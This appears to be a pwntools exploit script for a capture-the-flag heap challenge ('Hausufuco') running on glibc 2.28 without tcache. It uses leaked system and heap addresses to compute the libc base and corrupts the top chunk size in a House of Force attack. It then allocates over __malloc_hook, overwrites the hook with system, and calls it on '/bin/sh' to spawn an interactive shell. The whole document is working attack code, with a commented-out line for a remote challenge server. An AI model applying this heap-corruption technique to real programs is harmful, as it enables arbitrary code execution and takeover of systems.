from pwn import *

elf = context.binary = ELF("Hausufuco")
libc = ELF(b"./libc/glibc_2.28_no-tcache/libc.so.6")

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(
            [elf.path],
            gdbscript=gs
        )
    else:
        return process(elf.path)

def leak():
    io.sendlineafter(b"destino:", b"6")

    system_leak = int(io.recvline().strip(), 16)
    log.success(f"system @ {hex(system_leak)}")

    libc.address = system_leak - libc.sym.system
    log.success(f"libc base @ {hex(libc.address)}")

    heap = int(io.recvline().strip(), 16)
    log.success(f"heap base @ {hex(heap)}")

    return system_leak, heap


def build(size, name=b"A"):
    io.sendlineafter(b"destino:", b"1")
    io.sendlineafter(b"Tamano", str(size).encode())

    if isinstance(name, str):
        name = name.encode()

    io.sendafter(b"Nombre", name + b"\n")

def build2(size, name=b"A"):
    io.sendlineafter(b"destino:", b"1")
    io.sendlineafter(b"Tamano", hex(size).encode())

    if isinstance(name, str):
        name = name.encode()

    io.sendafter(b"Nombre", name + b"\n")


def renew(idx, data):
    io.sendlineafter(b"Elige tu destino:", b"3")
    io.sendlineafter(b"mara a renovar:", idx)
    io.sendafter(b"mara", data)


def trigger(cmd_addr):
    io.sendlineafter(b"destino:", b"1")
    io.sendline(hex(cmd_addr).encode())

io = start()
#io = remote("challs.caliphalhounds.com",32874)
system_addr, heap_base = leak()
log.info(f"Leak system(): {hex(system_addr)}")
log.info(f"Leak heap:     {hex(heap_base)}")
build(1, "Y"*8)
renew(b"0", b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))

target   = libc.sym.__malloc_hook - 0x20
heap_ptr = heap_base
distance = target - (heap_ptr + 0x30)

log.info(f"target={hex(target)} heap_ptr={hex(heap_ptr)} distance={distance}")
assert distance > 0

distance = (libc.sym.__malloc_hook -0x40 ) - (heap_base + 0x90)
build2(distance, b"/bin/sh\0")
build2(24, p64(libc.sym.system))
binsh = next(libc.search(b"/bin/sh"))
trigger(binsh)
binsh = next(libc.search(b"/bin/sh"))
log.info(f"'/bin/sh' @ {hex(binsh)}")

io.interactive()
